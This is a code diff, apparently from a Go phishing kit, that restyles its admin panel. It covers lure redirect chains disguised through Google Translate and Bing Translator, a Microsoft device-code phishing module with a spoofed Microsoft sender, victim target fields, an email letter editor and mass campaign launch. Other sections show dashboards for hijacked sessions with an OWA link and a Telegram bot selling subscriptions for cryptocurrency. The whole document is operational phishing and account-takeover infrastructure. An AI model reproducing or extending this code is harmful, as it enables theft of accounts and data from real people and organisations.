+				userCell := `<span style="color:var(--t3)">unassigned</span>`
 				if l.UserId != "" {
 					userCell = fmt.Sprintf(`<span class="badge badge-blue">%s</span>`, template.HTMLEscapeString(l.UserId))
 				}
 
-				// Generate redirect chain links
-				chainCell := `<span style="color:#383838">—</span>`
+				chainCell := `<span style="color:var(--t3)">—</span>`
 				if lureURL != "" {
 					parsedURL, err := url.Parse(lureURL)
 					if err == nil {
@@ -636,38 +700,31 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 							translateLink := "https://translate.google.com/translate?sl=auto&tl=en&u=" + url.QueryEscape(outer)
 							bingLink := "https://www.bing.com/translator?to=en&url=" + url.QueryEscape(outer)
 
-							chainID := fmt.Sprintf("chain-%d", i)
-							chainCell = fmt.Sprintf(`<details id="%s">
-<summary>▶ generate chain</summary>
+							chainCell = fmt.Sprintf(`<details>
+<summary>▶ Generate Chain</summary>
 <div class="chain-box">
-  <div class="label">Google Translate (recommended — silent)</div>
-  <div class="link"><a href="%s" target="_blank">%s</a>
-  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>
-
-  <div class="label">Bing Translator (silent)</div>
-  <div class="link"><a href="%s" target="_blank">%s</a>
-  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>
-
-  <div class="label">Direct chain (no wrapper)</div>
-  <div class="link"><a href="%s" target="_blank">%s</a>
-  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>
-
-  <div class="label" style="margin-top:8px">Hops</div>`,
-								chainID,
-								template.HTMLEscapeString(translateLink), template.HTMLEscapeString(truncateStr(translateLink, 60)), template.HTMLEscapeString(translateLink),
-								template.HTMLEscapeString(bingLink), template.HTMLEscapeString(truncateStr(bingLink, 60)), template.HTMLEscapeString(bingLink),
-								template.HTMLEscapeString(outer), template.HTMLEscapeString(truncateStr(outer, 60)), template.HTMLEscapeString(outer),
+  <div class="chain-label">Google Translate</div>
+  <div class="chain-link">%s
+  <button class="btn btn-ghost btn-xs" style="margin-left:6px" onclick="cp(this)" data-copy="%s">Copy</button></div>
+  <div class="chain-label">Bing Translator</div>
+  <div class="chain-link">%s
+  <button class="btn btn-ghost btn-xs" style="margin-left:6px" onclick="cp(this)" data-copy="%s">Copy</button></div>
+  <div class="chain-label">Direct Chain</div>
+  <div class="chain-link">%s
+  <button class="btn btn-ghost btn-xs" style="margin-left:6px" onclick="cp(this)" data-copy="%s">Copy</button></div>
+  <div class="chain-label" style="margin-top:8px">Hops</div>`,
+								template.HTMLEscapeString(truncateStr(translateLink, 56)), template.HTMLEscapeString(translateLink),
+								template.HTMLEscapeString(truncateStr(bingLink, 56)), template.HTMLEscapeString(bingLink),
+								template.HTMLEscapeString(truncateStr(outer, 56)), template.HTMLEscapeString(outer),
 							)
 							for j, hop := range hops {
-								chainCell += fmt.Sprintf(`<div class="hop">layer %d → %s</div>`, j+1, template.HTMLEscapeString(hop))
+								chainCell += fmt.Sprintf(`<div class="chain-hop">layer %d → %s</div>`, j+1, template.HTMLEscapeString(hop))
 							}
-							chainCell += fmt.Sprintf(`<div class="hop" style="color:#2a6a2a">final → %s</div>`, template.HTMLEscapeString(lureURL))
-							chainCell += `</div></details>`
+							chainCell += fmt.Sprintf(`<div class="chain-hop" style="color:var(--green)">final → %s</div></div></details>`, template.HTMLEscapeString(lureURL))
 						}
 					}
 				}
 
-				// Assign user form
 				userOptions := `<option value="-">— unassign —</option>`
 				for _, u := range userList {
 					sel := ""
@@ -677,25 +734,25 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 					userOptions += fmt.Sprintf(`<option value="%s"%s>%s</option>`,
 						template.HTMLEscapeString(u.Username), sel, template.HTMLEscapeString(u.Username))
 				}
-				assignForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=lures" style="display:flex;gap:4px;align-items:center">
+				assignForm := fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=lures" style="display:flex;gap:5px;align-items:center;margin-top:4px">
 <input type="hidden" name="action" value="assign_lure">
 <input type="hidden" name="lure_id" value="%d">
-<select name="username" style="font-size:.76rem;padding:3px 6px">%s</select>
-<button type="submit" style="font-size:.74rem;padding:3px 8px">save</button>
+<select name="username" style="font-size:11.5px;padding:4px 7px">%s</select>
+<button type="submit" class="btn btn-ghost btn-xs">Save</button>
 </form>`, i, userOptions)
 
 				deleteLureBtn := fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=lures" onsubmit="return confirm('Delete lure %d?')">
 <input type="hidden" name="action" value="delete_lure">
 <input type="hidden" name="lure_id" value="%d">
-<button type="submit" style="font-size:.74rem;padding:2px 8px">del</button>
+<button type="submit" class="btn btn-danger btn-xs">Delete</button>
 </form>`, i, i)
 
 				b.WriteString(fmt.Sprintf(`<tr>
-<td class="mono">%d</td>
-<td><span class="badge badge-red">%s</span><br><span style="color:#555;font-size:.72rem">%s</span></td>
+<td class="mono" style="color:var(--t3)">%d</td>
+<td><span class="badge badge-purple">%s</span><br><span style="color:var(--t3);font-size:11px">%s</span></td>
 <td>%s</td>
 <td>%s</td>
-<td>%s<br style="margin:4px">%s</td>
+<td>%s<br>%s</td>
 <td>%s</td>
 <td>%s</td>
 </tr>`, i,
@@ -711,9 +768,10 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		}
 		b.WriteString(`</div>`)
 
-	// ── SESSIONS ──────────────────────────────────────────────────────────
+	// ── SESSIONS ──────────────────────────────────────────────────────────────
 	case "sessions":
-		b.WriteString(`<div class="section"><h2>All Sessions</h2>`)
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd(fmt.Sprintf("All Sessions (%d)", len(allSessions))))
 		if len(allSessions) == 0 {
 			b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
 		} else {
@@ -721,18 +779,19 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		}
 		b.WriteString(`</div>`)
 
-	// ── BLACKLIST ─────────────────────────────────────────────────────────
+	// ── BLACKLIST ─────────────────────────────────────────────────────────────
 	case "blacklist":
-		b.WriteString(`<div class="section"><h2>Add to Blacklist</h2>`)
-		b.WriteString(`<form method="POST" action="/admin/panel?tab=blacklist">
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Block IP / CIDR"))
+		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel?tab=blacklist">
 <input type="hidden" name="action" value="blacklist_add">
 <div class="form-row">
-  <input type="text" name="ip" placeholder="IP or CIDR e.g. 1.2.3.4 or 1.2.3.0/24" style="width:280px">
-  <button type="submit">Block IP / CIDR</button>
-</div></form>`)
-		b.WriteString(`</div>`)
+  <input type="text" name="ip" placeholder="1.2.3.4 or 1.2.3.0/24" style="width:280px">
+  <button type="submit" class="btn btn-danger btn-sm">Block</button>
+</div></form></div></div>`)
 
-		b.WriteString(`<div class="section"><h2>Blocked IPs</h2>`)
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Blocked Entries"))
 		if GlobalBlacklist == nil {
 			b.WriteString(`<div class="empty">Blacklist not loaded.</div>`)
 		} else {
@@ -752,16 +811,15 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 <form class="inline" method="POST" action="/admin/panel?tab=blacklist">
 <input type="hidden" name="action" value="blacklist_remove">
 <input type="hidden" name="ip" value="%s">
-<button type="submit" style="font-size:.74rem;padding:2px 8px">remove</button>
-</form>
-</td></tr>`, template.HTMLEscapeString(ip), template.HTMLEscapeString(ip)))
+<button type="submit" class="btn btn-ghost btn-xs">Remove</button>
+</form></td></tr>`, template.HTMLEscapeString(ip), template.HTMLEscapeString(ip)))
 				}
 				for _, m := range GlobalBlacklist.masks {
 					if m.mask != nil {
 						b.WriteString(fmt.Sprintf(`<tr>
 <td class="mono">%s</td>
-<td><span class="badge badge-yellow">CIDR</span></td>
-<td><span style="color:#383838;font-size:.74rem">auto-blocked</span></td>
+<td><span class="badge badge-amber">CIDR</span></td>
+<td><span style="color:var(--t3);font-size:11px">auto-blocked</span></td>
 </tr>`, template.HTMLEscapeString(m.mask.String())))
 					}
 				}
@@ -770,9 +828,8 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		}
 		b.WriteString(`</div>`)
 
-	// ── DEVICE CODES ──────────────────────────────────────────────────────
+	// ── DEVICE CODES ──────────────────────────────────────────────────────────
 	case "devicecodes":
-		// Handle POST actions
 		if r.Method == "POST" {
 			action := r.FormValue("action")
 			switch action {
@@ -806,7 +863,6 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 				return
 
 			case "start_dc_single":
-				// Start a DC flow for one email — NO email sent. Use Preview Email to get the HTML.
 				email := strings.TrimSpace(r.FormValue("dc_single_email"))
 				if email == "" || !strings.Contains(email, "@") {
 					http.Redirect(w, r, "/admin/panel?tab=devicecodes&err=invalid+email", http.StatusSeeOther)
@@ -821,7 +877,6 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 				return
 
 			case "save_letter":
-				// Save letter.html and subject.txt to working directory.
 				letterHTML := r.FormValue("letter_html")
 				subjectTxt := r.FormValue("subject_txt")
 				if letterHTML != "" {
@@ -837,27 +892,19 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 
 		baseURL := "http://" + s.Cfg.GetServerExternalIP()
 
-		// ── SMTP config ──
-		b.WriteString(`<div class="section"><h2>SMTP Configuration</h2>`)
+		// SMTP config
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("SMTP Configuration"))
 		b.WriteString(fmt.Sprintf(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecodes">
 <input type="hidden" name="action" value="save_smtp">
-<div class="form-row">
-  <label style="color:#666;width:120px;font-size:.8rem">SMTP Host</label>
-  <input type="text" name="smtp_host" placeholder="smtp.gmail.com" value="%s" style="width:240px">
-  <label style="color:#666;width:60px;font-size:.8rem">Port</label>
-  <input type="text" name="smtp_port" placeholder="587" value="%s" style="width:70px">
+<div class="form-grid">
+  <div class="field"><label class="field-label">SMTP Host</label><input type="text" name="smtp_host" placeholder="smtp.gmail.com" value="%s"></div>
+  <div class="field"><label class="field-label">Port</label><input type="text" name="smtp_port" placeholder="587" value="%s"></div>
+  <div class="field"><label class="field-label">Username</label><input type="text" name="smtp_user" placeholder="user@gmail.com" value="%s"></div>
+  <div class="field"><label class="field-label">Password</label><input type="password" name="smtp_pass" placeholder="••••••••" value="%s"></div>
+  <div class="field field-full"><label class="field-label">From Name / Email</label><input type="text" name="smtp_from" placeholder="Microsoft Security &lt;no-reply@microsoft.com&gt;" value="%s"></div>
 </div>
-<div class="form-row">
-  <label style="color:#666;width:120px;font-size:.8rem">Username</label>
-  <input type="text" name="smtp_user" placeholder="user@gmail.com" value="%s" style="width:240px">
-  <label style="color:#666;width:60px;font-size:.8rem">Password</label>
-  <input type="password" name="smtp_pass" placeholder="••••••••" value="%s" style="width:160px">
-</div>
-<div class="form-row">
-  <label style="color:#666;width:120px;font-size:.8rem">From Name/Email</label>
-  <input type="text" name="smtp_from" placeholder="Microsoft Security &lt;no-reply@microsoft.com&gt;" value="%s" style="width:360px">
-</div>
-<button type="submit">Save SMTP</button>
+<button type="submit" class="btn btn-blue">Save SMTP</button>
 </form></div></div>`,
 			template.HTMLEscapeString(s.Cfg.GetSmtpHost()),
 			func() string {
@@ -872,36 +919,35 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 			template.HTMLEscapeString(s.Cfg.GetSmtpFrom()),
 		))
 
-		// ── Start DC without email (test mode) ──
+		// Start DC single
 		previewToken := r.URL.Query().Get("preview")
 		previewBanner := ""
 		if previewToken != "" {
 			phishLink := "http://" + s.Cfg.GetServerExternalIP() + "/dc/" + previewToken
-			previewBanner = fmt.Sprintf(`<div style="background:#1a2a0a;border:1px solid #3a7a1a;border-radius:4px;padding:12px 14px;margin-bottom:10px;font-size:13px;color:#7fcc40">
-<strong style="color:#aad480">DC Started!</strong><br>
-<div style="margin-top:6px;display:flex;flex-wrap:wrap;gap:8px;align-items:center">
-  <span style="font-family:monospace;font-size:.8rem;color:#ccc;word-break:break-all">%s</span>
-  <button onclick="cp(this)" data-copy="%s" style="background:#1e3a1e;border:1px solid #3a7a1a;color:#7fcc40;padding:3px 10px;border-radius:3px;cursor:pointer;font-size:.78rem">📋 Copy Phish Link</button>
-  <a href="/dc/preview/%s" target="_blank" style="color:#aad480;font-weight:700;font-size:.82rem">Preview Email →</a>
-</div>
-</div>`,
+			previewBanner = fmt.Sprintf(`<div class="flash-ok" style="border-color:rgba(16,185,129,.3)">
+<strong>✓ DC Started</strong> — phish link ready<br>
+<div style="margin-top:8px;display:flex;flex-wrap:wrap;gap:8px;align-items:center">
+  <span class="mono" style="color:var(--t1)">%s</span>
+  <button onclick="cp(this)" data-copy="%s" class="btn btn-green btn-sm">📋 Copy Phish Link</button>
+  <a href="/dc/preview/%s" target="_blank" class="btn btn-ghost btn-sm">Preview Email →</a>
+</div></div>`,
 				template.HTMLEscapeString(phishLink),
 				template.HTMLEscapeString(phishLink),
 				template.HTMLEscapeString(previewToken))
 		}
-		b.WriteString(`<div class="section"><h2>Start DC — No Email (Test Mode)</h2>`)
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Start DC — No Email (Test Mode)"))
 		b.WriteString(previewBanner)
 		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecodes">
 <input type="hidden" name="action" value="start_dc_single">
 <div class="form-row">
-  <label style="color:#666;width:160px;font-size:.8rem">Target Email</label>
-  <input type="text" name="dc_single_email" placeholder="victim@company.com" style="width:280px">
-  <button type="submit" style="margin-left:12px">Start DC</button>
+  <input type="text" name="dc_single_email" placeholder="victim@company.com" style="max-width:320px">
+  <button type="submit" class="btn btn-primary btn-sm">Start DC</button>
 </div>
-<p style="color:#555;font-size:.78rem;margin-top:8px">Starts the device code flow — NO email sent. Use <strong style="color:#888">Preview Email</strong> button to get the HTML, then send it yourself via Gmail/Outlook/etc.</p>
+<p style="color:var(--t3);font-size:11.5px;margin-top:8px">Starts the device code flow — no email sent. Use <strong style="color:var(--t2)">Preview Email</strong> to copy HTML and send manually.</p>
 </form></div></div>`)
 
-		// ── Letter editor ──
+		// Letter editor
 		var existingLetter, existingSubject string
 		if raw, err := os.ReadFile("letter.html"); err == nil {
 			existingLetter = string(raw)
@@ -909,62 +955,63 @@ func (s *HttpServer) handleAdminPanel(w http.ResponseWriter, r *http.Request) {
 		if raw, err := os.ReadFile("subject.txt"); err == nil {
 			existingSubject = strings.TrimSpace(string(raw))
 		}
-		b.WriteString(`<div class="section"><h2>Letter Editor (letter.html + subject.txt)</h2><div class="card">`)
-		b.WriteString(`<p style="color:#555;font-size:.78rem;margin-bottom:10px">
-Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <code style="color:#aaa">SILENTCODERSEMAILURL</code> (URL-encoded) · <code style="color:#aaa">DCLANDING</code> (phish link with login_hint) · <code style="color:#aaa">DCCODE</code> (device code) · <code style="color:#aaa">USER</code> · <code style="color:#aaa">DOMAIN</code> · <code style="color:#aaa">DOMC</code>
-</p>`)
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Letter Editor"))
+		b.WriteString(`<div class="card">`)
+		b.WriteString(`<p style="color:var(--t3);font-size:11.5px;margin-bottom:14px">Tokens: <code style="color:var(--t2)">SILENTCODERSEMAIL</code> · <code style="color:var(--t2)">SILENTCODERSEMAILURL</code> · <code style="color:var(--t2)">DCLANDING</code> · <code style="color:var(--t2)">DCCODE</code> · <code style="color:var(--t2)">USER</code> · <code style="color:var(--t2)">DOMAIN</code> · <code style="color:var(--t2)">DOMC</code></p>`)
 		b.WriteString(fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=devicecodes">
 <input type="hidden" name="action" value="save_letter">
-<div class="form-row" style="align-items:flex-start">
-  <label style="color:#666;width:120px;font-size:.8rem;margin-top:6px">Subject</label>
-  <input type="text" name="subject_txt" value="%s" placeholder="Microsoft Security Alert: Action Required" style="width:500px">
+<div class="form-grid">
+  <div class="field field-full"><label class="field-label">Subject Line</label>
+    <input type="text" name="subject_txt" value="%s" placeholder="Microsoft Security Alert: Action Required">
+  </div>
+  <div class="field field-full"><label class="field-label">Email HTML (letter.html)</label>
+    <textarea name="letter_html" rows="14" style="font-family:monospace;font-size:11.5px;color:#7ec8e3" placeholder="Paste full HTML email — tokens replaced on send/preview">%s</textarea>
+  </div>
 </div>
-<div class="form-row" style="align-items:flex-start;margin-top:10px">
-  <label style="color:#666;width:120px;font-size:.8rem;margin-top:6px">letter.html</label>
-  <textarea name="letter_html" rows="16" style="width:700px;background:#111;border:1px solid #2a2a2a;color:#7ec8e3;padding:10px;border-radius:4px;font-family:monospace;font-size:.78rem;resize:vertical" placeholder="Paste your full HTML email here — tokens like SILENTCODERSEMAIL will be replaced when previewing/sending">%s</textarea>
-</div>
-<button type="submit" style="margin-top:10px">Save Letter</button>
-<span style="color:#555;font-size:.78rem;margin-left:12px">Saved as letter.html + subject.txt in the working directory. Takes effect immediately for all future sends/previews.</span>
+<button type="submit" class="btn btn-blue btn-sm">Save Letter</button>
+<span style="color:var(--t3);font-size:11.5px;margin-left:10px">Saved to letter.html + subject.txt. Takes effect immediately.</span>
 </form></div></div>`,
 			template.HTMLEscapeString(existingSubject),
 			template.HTMLEscapeString(existingLetter),
 		))
 
-		// ── Launch campaign (sends via SMTP) ──
-		b.WriteString(`<div class="section"><h2>Launch Campaign (requires SMTP)</h2><div class="card">
-<form method="POST" action="/admin/panel?tab=devicecodes">
+		// Launch campaign
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Launch Campaign"))
+		b.WriteString(`<div class="card"><form method="POST" action="/admin/panel?tab=devicecodes">
 <input type="hidden" name="action" value="launch_campaign">
-<div class="form-row">
-  <label style="color:#666;width:120px;font-size:.8rem">Campaign Name</label>
-  <input type="text" name="camp_name" placeholder="Q2 Targets" style="width:220px">
-  <label style="color:#666;width:80px;font-size:.8rem">Template</label>
-  <select name="camp_template">
-    <option value="security_alert">Microsoft Security Alert</option>
-    <option value="it_helpdesk">IT Helpdesk</option>
-    <option value="custom">Use letter.html (custom)</option>
-  </select>
+<div class="form-grid">
+  <div class="field"><label class="field-label">Campaign Name</label><input type="text" name="camp_name" placeholder="Q2 Targets"></div>
+  <div class="field"><label class="field-label">Template</label>
+    <select name="camp_template">
+      <option value="security_alert">Microsoft Security Alert</option>
+      <option value="it_helpdesk">IT Helpdesk</option>
+      <option value="custom">Custom (letter.html)</option>
+    </select>
+  </div>
+  <div class="field field-full"><label class="field-label">Email List (one per line)</label>
+    <textarea name="camp_emails" rows="6" placeholder="one@company.com&#10;two@company.com"></textarea>
+  </div>
 </div>
-<div class="form-row" style="align-items:flex-start">
-  <label style="color:#666;width:120px;font-size:.8rem;margin-top:6px">Email List</label>
-  <textarea name="camp_emails" rows="6" placeholder="one@company.com&#10;two@company.com&#10;..." style="width:400px;background:#171717;border:1px solid #2e2e2e;color:#e0e0e0;padding:8px;border-radius:4px;font-size:.84rem;resize:vertical"></textarea>
-</div>
-<button type="submit" class="btn-green">🚀 Launch</button>
-<span style="color:#555;font-size:.78rem;margin-left:12px">Each target gets a unique code + landing page. Emails sent via SMTP above.</span>
+<button type="submit" class="btn btn-green">🚀 Launch Campaign</button>
+<span style="color:var(--t3);font-size:11.5px;margin-left:10px">Each target gets a unique code. Emails sent via SMTP above.</span>
 </form></div></div>`)
 
-		// ── Active sessions table ──
+		// Active DC sessions
 		allTargets := GetDCTargets()
-		b.WriteString(`<div class="section"><h2>Active Sessions</h2>`)
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd(fmt.Sprintf("Active Sessions (%d)", len(allTargets))))
 		if len(allTargets) == 0 {
 			b.WriteString(`<div class="empty">No device code sessions yet.</div>`)
 		} else {
 			b.WriteString(`<div class="table-wrap"><table><thead><tr>
 <th>#</th><th>Email / Tenant</th><th>Code</th><th>Status</th>
-<th>Phish Link (copy &amp; test)</th><th>Started</th><th>Preview / Dashboard</th></tr></thead><tbody>`)
+<th>Phish Link</th><th>Started</th><th>Actions</th></tr></thead><tbody>`)
 			for i := len(allTargets) - 1; i >= 0; i-- {
 				tgt := allTargets[i]
 				status := tgt.GetStatus()
-				badgeClass := "badge-yellow"
+				badgeClass := "badge-amber"
 				switch status {
 				case "completed":
 					badgeClass = "badge-green"
@@ -978,10 +1025,9 @@ Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <cod
 				landingURL := baseURL + "/dc/" + tgt.LandingToken
 				landingCell := fmt.Sprintf(
 					`<div style="display:flex;flex-direction:column;gap:4px">
-<a href="%s" target="_blank" class="mono" style="font-size:.73rem;color:#52b0e0;word-break:break-all">%s</a>
-<button class="btn-gray" style="font-size:.72rem;padding:3px 10px;align-self:flex-start" onclick="cp(this)" data-copy="%s">📋 Copy Link</button>
+<span class="mono url-cell">%s</span>
+<button class="btn btn-ghost btn-xs" style="align-self:flex-start" onclick="cp(this)" data-copy="%s">📋 Copy Link</button>
 </div>`,
-					template.HTMLEscapeString(landingURL),
 					template.HTMLEscapeString(landingURL),
 					template.HTMLEscapeString(landingURL),
 				)
@@ -991,27 +1037,27 @@ Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <cod
 				tgt.mu.Unlock()
 				previewURL := "/dc/preview/" + tgt.LandingToken
 				tokenCell := fmt.Sprintf(
-					`<a href="%s" target="_blank" style="display:inline-block;background:#1e3a1e;color:#7fcc40;padding:4px 10px;border-radius:3px;font-size:11px;font-weight:700;text-decoration:none;border:1px solid #3a7a1a">Preview Email</a>`,
+					`<a href="%s" target="_blank" class="btn btn-ghost btn-xs">Preview Email</a>`,
 					template.HTMLEscapeString(previewURL))
 				if at != "" {
 					useURL := "/dc/use/" + tgt.LandingToken
 					openURL := "/dc/open/" + tgt.LandingToken
 					tokenCell = fmt.Sprintf(
-						`<div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
-<a href="%s" target="_blank" style="display:inline-block;background:#0078d4;color:#fff;padding:4px 12px;border-radius:3px;font-size:11px;font-weight:700;text-decoration:none;letter-spacing:.3px">Dashboard</a>
-<a href="%s" target="_blank" style="display:inline-block;background:#155724;border:1px solid #28a745;color:#fff;padding:4px 10px;border-radius:3px;font-size:11px;font-weight:700;text-decoration:none">⚡ OWA</a>
+						`<div style="display:flex;gap:6px;flex-wrap:wrap">
+<a href="%s" target="_blank" class="btn btn-blue btn-xs">Dashboard</a>
+<a href="%s" target="_blank" class="btn btn-green btn-xs">⚡ OWA</a>
 </div>`,
 						template.HTMLEscapeString(useURL),
 						template.HTMLEscapeString(openURL))
 				}
 
 				b.WriteString(fmt.Sprintf(`<tr>
-<td class="mono">%d</td>
-<td class="mono">%s</td>
-<td><span style="font-family:monospace;font-weight:700;font-size:1rem;letter-spacing:3px;color:#e0a040">%s</span></td>
+<td class="mono" style="color:var(--t3)">%d</td>
+<td class="mono" style="color:var(--t1)">%s</td>
+<td><span class="mono" style="font-weight:700;font-size:14px;letter-spacing:3px;color:var(--amber)">%s</span></td>
 <td><span class="badge %s">%s</span></td>
 <td>%s</td>
-<td class="mono" style="color:#555">%s</td>
+<td class="mono" style="color:var(--t3);font-size:11px">%s</td>
 <td>%s</td>
 </tr>`,
 					tgt.ID,
@@ -1027,53 +1073,33 @@ Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <cod
 		}
 		b.WriteString(`</div>`)
 
-	// ── TELEGRAM BOT ──────────────────────────────────────────────────────
+	// ── TELEGRAM BOT ──────────────────────────────────────────────────────────
 	case "telegram":
-		// ── Bot configuration card ──
-		b.WriteString(`<div class="section"><h2>Bot Configuration</h2>`)
-		b.WriteString(fmt.Sprintf(`<div class="card">
-<form method="POST" action="/admin/panel?tab=telegram">
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd("Bot Configuration"))
+		b.WriteString(fmt.Sprintf(`<div class="card"><form method="POST" action="/admin/panel?tab=telegram">
 <input type="hidden" name="action" value="save_bot_config">
-<div class="form-row">
-  <label style="color:#666;width:160px;font-size:.8rem">Bot Token</label>
-  <input type="text" name="bot_token" placeholder="from @BotFather" value="%s" style="width:340px">
+<div class="form-grid">
+  <div class="field field-full"><label class="field-label">Bot Token (from @BotFather)</label><input type="text" name="bot_token" placeholder="1234567890:AABBCCddEEff..." value="%s"></div>
+  <div class="field"><label class="field-label">Admin Chat ID</label><input type="text" name="bot_admin_chat_id" placeholder="your Telegram chat ID" value="%d"></div>
+  <div class="field"><label class="field-label">Price (USD/month)</label><input type="text" name="sub_price" placeholder="150" value="%d"></div>
+  <div class="field"><label class="field-label">BTC Address</label><input type="text" name="crypto_btc" placeholder="Bitcoin address" value="%s"></div>
+  <div class="field"><label class="field-label">ETH Address</label><input type="text" name="crypto_eth" placeholder="Ethereum address" value="%s"></div>
+  <div class="field"><label class="field-label">USDT Address (TRC20)</label><input type="text" name="crypto_usdt" placeholder="USDT address" value="%s"></div>
 </div>
-<div class="form-row">
-  <label style="color:#666;width:160px;font-size:.8rem">Admin Chat ID</label>
-  <input type="text" name="bot_admin_chat_id" placeholder="your Telegram chat ID" value="%d" style="width:200px">
-</div>
-<div class="form-row">
-  <label style="color:#666;width:160px;font-size:.8rem">BTC Address</label>
-  <input type="text" name="crypto_btc" placeholder="Bitcoin address" value="%s" style="width:340px">
-</div>
-<div class="form-row">
-  <label style="color:#666;width:160px;font-size:.8rem">ETH Address</label>
-  <input type="text" name="crypto_eth" placeholder="Ethereum address" value="%s" style="width:340px">
-</div>
-<div class="form-row">
-  <label style="color:#666;width:160px;font-size:.8rem">USDT Address</label>
-  <input type="text" name="crypto_usdt" placeholder="USDT (TRC20) address" value="%s" style="width:340px">
-</div>
-<div class="form-row">
-  <label style="color:#666;width:160px;font-size:.8rem">Price (USD/month)</label>
-  <input type="text" name="sub_price" placeholder="150" value="%d" style="width:100px">
-</div>
-<div class="form-row" style="margin-top:12px">
-  <button type="submit" class="btn-blue">Save Bot Config</button>
-  <span style="color:#555;font-size:.78rem;margin-left:8px">Token change requires restart</span>
-</div>
-</form></div>`,
-		template.HTMLEscapeString(s.Cfg.GetBotToken()),
-		s.Cfg.GetBotAdminChatId(),
-		template.HTMLEscapeString(s.Cfg.GetCryptoBTC()),
-		template.HTMLEscapeString(s.Cfg.GetCryptoETH()),
-		template.HTMLEscapeString(s.Cfg.GetCryptoUSDT()),
-		s.Cfg.GetSubPrice(),
-	))
-		b.WriteString(`</div>`)
+<button type="submit" class="btn btn-blue">Save Config</button>
+<span style="color:var(--t3);font-size:11.5px;margin-left:10px">Token change requires restart</span>
+</form></div></div>`,
+			template.HTMLEscapeString(s.Cfg.GetBotToken()),
+			s.Cfg.GetBotAdminChatId(),
+			s.Cfg.GetSubPrice(),
+			template.HTMLEscapeString(s.Cfg.GetCryptoBTC()),
+			template.HTMLEscapeString(s.Cfg.GetCryptoETH()),
+			template.HTMLEscapeString(s.Cfg.GetCryptoUSDT()),
+		))
 
-		// ── Subscriptions table ──
-		b.WriteString(`<div class="section"><h2>Subscriptions</h2>`)
+		b.WriteString(`<div class="section">`)
+		b.WriteString(sectionHd(fmt.Sprintf("Subscriptions (%d)", len(allSubs))))
 		if len(allSubs) == 0 {
 			b.WriteString(`<div class="empty">No subscriptions yet.</div>`)
 		} else {
@@ -1086,35 +1112,35 @@ Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <cod
 				case "active":
 					statusBadge = `<span class="badge badge-green">active</span>`
 				case "pending":
-					statusBadge = `<span class="badge badge-yellow">pending</span>`
+					statusBadge = `<span class="badge badge-amber">pending</span>`
 				case "expired":
 					statusBadge = `<span class="badge badge-red">expired</span>`
 				}
 
-				expiry := `<span style="color:#555">—</span>`
+				expiry := `<span style="color:var(--t3)">—</span>`
 				if sub.ExpiresAt > 0 {
 					expiry = time.Unix(sub.ExpiresAt, 0).Format("2006-01-02")
 				}
 
-				txCell := `<span style="color:#555">—</span>`
+				txCell := `<span style="color:var(--t3)">—</span>`
 				if sub.TxHash != "" {
-					txCell = fmt.Sprintf(`<span class="mono" style="font-size:.74rem">%s</span>`, template.HTMLEscapeString(truncateStr(sub.TxHash, 18)))
+					txCell = fmt.Sprintf(`<span class="mono" style="font-size:11px">%s</span>`, template.HTMLEscapeString(truncateStr(sub.TxHash, 18)))
 				}
 
-				linksCell := `<span style="color:#555">—</span>`
+				linksCell := `<span style="color:var(--t3)">—</span>`
 				if sub.ChainTranslate != "" || sub.LureURL != "" {
-					linksCell = `<details><summary style="font-size:.76rem;color:#52b0e0">▶ links</summary><div class="chain-box" style="font-size:.74rem">`
+					linksCell = `<details><summary>▶ links</summary><div class="chain-box">`
 					if sub.LureURL != "" {
-						linksCell += fmt.Sprintf(`<div class="label">Direct URL</div><div class="link"><a href="%s" target="_blank">%s</a> <button class="btn-gray" style="font-size:.68rem;padding:1px 5px" onclick="cp(this)" data-copy="%s">copy</button></div>`,
-							template.HTMLEscapeString(sub.LureURL), template.HTMLEscapeString(truncateStr(sub.LureURL, 40)), template.HTMLEscapeString(sub.LureURL))
+						linksCell += fmt.Sprintf(`<div class="chain-label">Direct URL</div><div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>`,
+							template.HTMLEscapeString(truncateStr(sub.LureURL, 40)), template.HTMLEscapeString(sub.LureURL))
 					}
